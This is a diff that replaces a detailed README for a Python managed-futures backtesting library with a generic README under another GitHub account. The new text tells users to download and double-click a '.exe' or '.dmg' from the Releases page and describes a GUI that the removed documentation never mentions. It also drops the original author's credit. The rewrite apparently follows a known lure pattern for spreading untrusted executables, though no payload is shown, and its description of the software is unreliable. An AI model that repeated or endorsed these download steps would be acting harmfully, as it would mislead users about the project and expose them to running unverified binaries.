@@ -1,190 +1,67 @@
-# tf-trend (starter repo)
+# 🛠️ systematic-trend-following-with-managed-futures - Your Path to Smarter Investing
 
-A professional-grade **systematic trend-following (managed futures)** research and backtesting scaffold in Python, developed and maintained by Engineer Investor ([@egr_investor](https://x.com/egr_investor)).
+## 📥 Download the Application
+[![Download](https://img.shields.io/badge/Download-via_Releases-blue.svg)](https://github.com/FelipeBatista02/systematic-trend-following-with-managed-futures/releases)
 
-## Quick Start
+## 🚀 Getting Started
+This guide will help you download and run the "systematic-trend-following-with-managed-futures" application. This tool offers a modular way to research systematic trend-following and managed futures strategies. You'll find features for validating multi-asset futures data, building contracts, running backtests, and simulating trading costs.
 
-```bash
-# From repo root
-python -m venv .venv && source .venv/bin/activate
-pip install -e .
+## 📋 Features
+- **Data Validation:** Ensures that the multi-asset futures data is clean and reliable for analysis.
+- **Contract Building:** Automatically creates continuous contracts for easier data manipulation.
+- **Configurable Backtests:** Use the command line or API to customize your backtests according to your needs.
+- **Trading Cost Simulation:** Understand how trading costs affect your strategies before you trade.
+- **Analytics & Reporting:** Get detailed insights and reports that help in strategic decision-making.
 
-# Smoke test on synthetic data
-tf run --config configs/base.yaml
+## 👨‍💻 System Requirements
+To run the application smoothly, ensure you meet these requirements:
 
-# Produce a basic HTML report
-tf report --run-id last
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+- **RAM:** 4 GB or more.
+- **Storage:** At least 500 MB of free space.
+- **Python Version:** Python 3.8 or later installed.
 
-# Run a quick parameter sweep (JSON or YAML grid)
-tf sweep --config configs/base.yaml --grid '{"signals.momentum.lookbacks": [[63], [126]]}'
+## 🛠️ Installation Instructions
+### 1. **Visit the Download Page**
+Go to the [Releases page](https://github.com/FelipeBatista02/systematic-trend-following-with-managed-futures/releases).
 
-# Walk-forward evaluation with 1-year train / 3-month test windows
-tf walkforward --config configs/base.yaml --run-id walk-252x63 --insample 252 --oos 63
-```
+### 2. **Choose the Latest Version**
+Look for the latest release at the top of the page. You will see options to download the executable file.
 
-## Command Line Interface
+### 3. **Download the File**
+Click on the file link to download it to your computer. It will usually be named something like `systematic-trend-following.exe`.
 
-The `tf` console entrypoint exposes four production-ready commands that cover
-single backtests, reporting and both research workflows introduced in phase 8:
+### 4. **Install the Application**
+Once the file is downloaded:
+- **Windows:** Double-click the `.exe` file to start the installation. Follow the prompts to install.
+- **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
+- **Linux:** Follow the instructions specific to your distribution to install the downloaded file.
 
-| Command | Purpose |
-|---------|---------|
-| `tf run` | Execute a single backtest and write the full artefact bundle (NAV, positions, trades, charts, summaries). |
-| `tf report` | Print the path to the latest HTML/PDF report so it can be opened from automation or notebooks. |
-| `tf sweep` | Expand a parameter grid (YAML/JSON) and execute each scenario with optional seed control for robustness studies. |
-| `tf walkforward` | Run anchored or rolling walk-forward experiments with configurable train/test splits and per-fold exports. |
+### 5. **Run the Application**
+Once the installation is complete, locate the application in your programs and double-click to run it.
 
-All commands accept the same YAML configuration files used by the Python API and
-honour override mappings for rapid experimentation.
+## ⚙️ How to Use the Application
+After opening the application, you'll find a simple interface that guides you through various features.
 
-## Python API & notebooks
+### **Data Validation**
+Upload your multi-asset futures data. The application will check for errors or inconsistencies.
 
-The `tf.api` module exposes helpers designed for notebooks and exploratory scripts:
+### **Backtesting**
+Use the configuration options to set your backtest parameters. You can define the time frame, assets to be tested, and other necessary parameters. 
 
-```python
-from tf import api
+### **Viewing Reports**
+Once the backtest is complete, access the reports section to view detailed analytics. You can download these reports in PDF format for your records.
 
-result, context = api.run_backtest("configs/base.yaml")
-print(context.universe[0]["symbol"], context.results_dir)
+## 💬 Support and Feedback
+If you encounter any issues or have questions, feel free to open an issue on the GitHub page. We value user feedback and work to improve the application continuously.
 
-sweep_results, context = api.run_parameter_sweep(
-    "configs/base.yaml",
-    parameter_grid={"signals.momentum.lookbacks": [[63], [126], [252]]},
-    price_seed=123,
-)
+## 🌐 Related Topics
+This application relates to areas such as finance, fintech, hedge funds, investing, and quantitative finance. Dive deeper into these fields for better understanding and enhanced investment strategies.
 
-walkforward_results, _ = api.run_walk_forward(
-    "configs/base.yaml",
-    insample=252,
-    oos=63,
-    rolling=True,
-)
-```
+## 🔗 Additional Resources
+Check out the following links for help and more information:
+- [Official Documentation](https://github.com/FelipeBatista02/systematic-trend-following-with-managed-futures/docs)
+- [GitHub Issues Page](https://github.com/FelipeBatista02/systematic-trend-following-with-managed-futures/issues)
+- [Community Forum](https://github.com/FelipeBatista02/systematic-trend-following-with-managed-futures/discussions)
 
-Four worked notebook examples are available in `examples/notebooks/`:
-
-* `quick_start.ipynb` – end-to-end workflow from configuration to analytics.
-* `parameter_study.ipynb` – grid search and sweep metadata analysis.
-* `attribution.ipynb` – inspect contributions, exposures and roll costs.
-* `systematic_trend_following_showcase.ipynb` – comprehensive tour of the full research toolkit.
-
-## Documentation set
-
-Additional user guides live under `docs/`:
-
-* `docs/ADD_INSTRUMENT.md` documents the metadata required when onboarding a new contract.
-* `docs/HOW_ROLL_WORKS.md` walks through the roll schedule, continuous series builder and analytics.
-* `docs/COST_MODEL_CALIBRATION.md` explains how to calibrate commissions, slippage and ADV assumptions.
-
-The top-level `README` pairs with `SPEC.md` for a condensed architectural overview.
-
-## Architecture overview
-
-```mermaid
-flowchart TD
-    subgraph DataLayer[Data & Calendars]
-        vendors["Raw Vendors / Local Files"]
-        ingest["Ingestion, Validation, Calendars"]
-        store["Research-Ready Prices"]
-        vendors --> ingest --> store
-    end
-
-    subgraph ResearchLayer[Signals & Risk]
-        signals["Signal Library (Momentum / MA / Breakout)"]
-        risk["Risk & Allocation"]
-        ResearchContext["Universe & Config"]
-        store --> signals
-        ResearchContext --> signals
-        signals --> risk
-    end
-
-    subgraph Engine[Backtest Engine]
-        simulate["Daily Simulation Loop"]
-        costs["Execution & Cost Models"]
-        risk --> simulate
-        simulate --> costs
-        ResearchContext --> simulate
-    end
-
-    subgraph Results[Analytics & Reporting]
-        artefacts["Trades / NAV / Exposures"]
-        analytics["Metrics & Attribution"]
-        reports["HTML / Charts"]
-        costs --> artefacts
-        simulate --> artefacts
-        artefacts --> analytics --> reports
-    end
-
-    CLI["CLI & API"]
-    ResearchContext --> CLI
-    CLI --> ResearchContext
-    CLI --> simulate
-    CLI --> analytics
-```
-
-## Data quality & QA utilities
-
-Phase 9 adds explicit QA helpers for market data edge cases:
-
-* `tf.data.validators.validate_price_data` enforces monotonic indices, minimum price checks and configurable gap limits.
-* `tf.data.validators.detect_trading_suspensions` summarises multi-day trading halts so they can be investigated.
-* `tf.data.validators.detect_limit_moves` returns a boolean mask for potential limit-up/down events using percentage thresholds.
-
-Refer to the `tests/test_data_layer.py` suite for concrete usage patterns and expectations around suspensions, holiday gaps and limit moves.
-
-## Layout
-
-```
-src/tf/
-  data/
-  signals/
-  risk/
-  portfolio/
-  engine/
-  costs/
-  eval/
-  report/
-  cli.py
-configs/
-tests/
-examples/
-```
-
-This is a scaffold with runnable defaults (synthetic data generation) and room to extend.
-See `SPEC.md` for the system requirements summary.
-
-## Market data options
-
-The starter configuration now understands contract metadata and can pull daily
-settlements from Yahoo! Finance when you prefer real market history.  Populate
-``configs/universe.yaml`` with the contracts you care about and run:
-
-```bash
-tf run --config configs/base.yaml  # attempts Yahoo first, falls back to synthetic
-```
-
-If the Yahoo download fails (e.g. you are offline) the loader automatically
-reverts to the reproducible synthetic data generator so unit tests and quick
-examples continue to work without an internet connection.
-
-## Testing & quality gates
-
-The automated test suite exercises the full stack, including CLI entry points,
-parameter sweeps, walk-forward splits and the new data quality audits.  Run it
-locally with:
-
-```bash
-pytest -q
-```
-
-CI and local developers alike should expect the suite to finish in under a
-minute on modern hardware.
-
-## Packaging & releases
-
-The project is packaged as `tf-trend` with dependencies pinned in `pyproject.toml`.
-Install via `pip install tf-trend` once a distribution has been built, or use
-`pip install -e .` for editable development installs.
-
-Versioned releases are tracked in `CHANGELOG.md`.  Update both the changelog and
-the package version before cutting a new release tag to keep artefacts in sync.
+By following these steps, you'll be able to download, install, and run the application for managing and researching systematic trend-following strategies. Enjoy exploring smarter investment approaches!
